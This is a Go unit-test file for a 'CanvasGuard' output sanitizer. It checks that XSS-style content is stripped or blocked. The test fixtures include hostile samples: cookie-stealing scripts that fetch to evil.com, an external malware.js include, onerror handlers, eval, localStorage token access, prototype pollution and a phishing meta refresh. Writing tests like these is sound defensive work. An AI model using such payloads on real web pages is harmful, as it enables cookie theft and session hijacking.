package safety

import (
	"strings"
	"testing"
)

// ─── Script tag removal ───────────────────────────────────────────────────────

func TestCanvasGuard_ScriptTag_Stripped(t *testing.T) {
	g := NewCanvasGuard()
	output := `<html><body><h1>Hello</h1><script>alert(document.cookie)</script><p>World</p></body></html>`
	res := g.ScanOutput(output)
	if strings.Contains(res.Sanitized, "<script>") {
		t.Error("<script> tag not stripped from canvas output")
	}
	if res.Blocked {
		t.Log("note: blocked (dangerous JS pattern may also have triggered)")
	}
	// Check violation recorded
	found := false
	for _, v := range res.Violations {
		if strings.Contains(v, "inline_script_tag") {
			found = true
		}
	}
	if !found {
		t.Error("inline_script_tag violation not recorded")
	}
}

func TestCanvasGuard_MultilineScript_Stripped(t *testing.T) {
	g := NewCanvasGuard()
	output := `<div>Content</div>
<script type="text/javascript">
  var x = document.cookie;
  fetch('https://evil.com?c='+x);
</script>
<footer>Footer</footer>`
	res := g.ScanOutput(output)
	if strings.Contains(res.Sanitized, "<script") {
		t.Error("multiline script tag not stripped")
	}
}

// ─── Event handler attributes ─────────────────────────────────────────────────

func TestCanvasGuard_EventHandlers_Removed(t *testing.T) {
	g := NewCanvasGuard()
	output := `<button onclick="stealCookies()">Click me</button><img src="x" onerror="alert(1)">`
	res := g.ScanOutput(output)
	if strings.Contains(res.Sanitized, "onclick") {
		t.Error("onclick event handler not removed")
	}
	if strings.Contains(res.Sanitized, "onerror") {
		t.Error("onerror event handler not removed")
	}
	found := false
	for _, v := range res.Violations {
		if strings.Contains(v, "event_handler_attr") {
			found = true
		}
	}
	if !found {
		t.Error("event_handler_attr violation not recorded")
	}
}

// ─── Dangerous JS patterns — blocked ─────────────────────────────────────────

func TestCanvasGuard_DocumentCookie_Blocked(t *testing.T) {
	g := NewCanvasGuard()
	output := `<div>Here is code: var c = document.cookie; sendToServer(c);</div>`
	res := g.ScanOutput(output)
	if !res.Blocked {
		t.Error("document.cookie access should be blocked in canvas output")
	}
}

func TestCanvasGuard_LocalStorage_Blocked(t *testing.T) {
	g := NewCanvasGuard()
	output := `<p>Store: localStorage["token"] = "xyz"</p>`
	res := g.ScanOutput(output)
	if !res.Blocked {
		t.Error("localStorage access should be blocked in canvas output")
	}
}

func TestCanvasGuard_EvalCall_Blocked(t *testing.T) {
	g := NewCanvasGuard()
	output := `<div>Run: eval("malicious code")</div>`
	res := g.ScanOutput(output)
	if !res.Blocked {
		t.Error("eval() call should be blocked in canvas output")
	}
}

func TestCanvasGuard_ExternalFetch_Blocked(t *testing.T) {
	g := NewCanvasGuard()
	output := `<p>Do: fetch('https://evil.com/exfil?data=secret')</p>`
	res := g.ScanOutput(output)
	if !res.Blocked {
		t.Error("external fetch() call should be blocked in canvas output")
	}
}

func TestCanvasGuard_WebSocket_Blocked(t *testing.T) {
	g := NewCanvasGuard()
	output := `<div>Connect: new WebSocket('wss://evil.com')</div>`
	res := g.ScanOutput(output)
	if !res.Blocked {
		t.Error("WebSocket connection should be blocked in canvas output")
	}
}

func TestCanvasGuard_PrototypePollution_Blocked(t *testing.T) {
	g := NewCanvasGuard()
	output := `<p>obj.__proto__["isAdmin"] = true</p>`
	res := g.ScanOutput(output)
	if !res.Blocked {
		t.Error("prototype pollution should be blocked in canvas output")
	}
}

// ─── External resources: non-allowlist blocked ────────────────────────────────

func TestCanvasGuard_ExternalResource_NonAllowlist_Blocked(t *testing.T) {
	g := NewCanvasGuard()
	output := `<script src="https://evil.com/malware.js"></script>`
	res := g.ScanOutput(output)
	// Script tag stripped AND external resource blocked
	if strings.Contains(res.Sanitized, "evil.com") {
		t.Error("non-allowlisted external resource not removed")
	}
}

func TestCanvasGuard_ExternalResource_AllowedCDN_Passes(t *testing.T) {
	g := NewCanvasGuard()
	// Allowlisted CDNs should pass
	output := `<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5/dist/css/bootstrap.min.css">`
	res := g.ScanOutput(output)
	if strings.Contains(res.Sanitized, "#[blocked-external-resource]") {
		t.Error("allowlisted CDN URL should not be blocked")
	}
}

// ─── Dangerous HTML redirects ─────────────────────────────────────────────────

func TestCanvasGuard_MetaRefresh_Stripped(t *testing.T) {
	g := NewCanvasGuard()
	output := `<meta http-equiv="refresh" content="0;url=https://phishing.com"><p>Content</p>`
	res := g.ScanOutput(output)
	if strings.Contains(res.Sanitized, "http-equiv") {
		t.Error("meta refresh not stripped from canvas output")
	}
}

// ─── Clean HTML passes ────────────────────────────────────────────────────────

func TestCanvasGuard_CleanHTML_Passes(t *testing.T) {
	g := NewCanvasGuard()
	clean := []string{
		`<div class="card"><h2>Hello World</h2><p>This is a paragraph.</p></div>`,
		`<ul><li>Item 1</li><li>Item 2</li></ul>`,
		`<table><tr><th>Name</th><th>Value</th></tr><tr><td>Foo</td><td>Bar</td></tr></table>`,
		`<form action="/submit" method="post"><input type="text" name="q"><button type="submit">Go</button></form>`,
	}
	for _, html := range clean {
		res := g.ScanOutput(html)
		if res.Blocked {
			t.Errorf("clean HTML blocked: %q violations=%v", html[:min(len(html), 60)], res.Violations)
		}
	}
}

// ─── CSP header suggestion ────────────────────────────────────────────────────

func TestCanvasGuard_CSPHeader_Returned(t *testing.T) {
	g := NewCanvasGuard()
	res := g.ScanOutput("<p>Hello</p>")
	if strings.TrimSpace(res.CSPHeader) == "" {
		t.Error("canvas guard should return a CSP header suggestion")
	}
	if !strings.Contains(res.CSPHeader, "default-src") {
		t.Error("CSP header should contain default-src directive")
	}
}

// ─── Blocked output message not empty ────────────────────────────────────────

func TestCanvasGuard_BlockedOutputMessage_NotEmpty(t *testing.T) {
	g := NewCanvasGuard()
	res := g.ScanOutput(`<div>var x = document.cookie;</div>`)
	if res.Blocked && strings.TrimSpace(res.Sanitized) == "" {
		t.Error("blocked canvas output should return a non-empty message")
	}
}
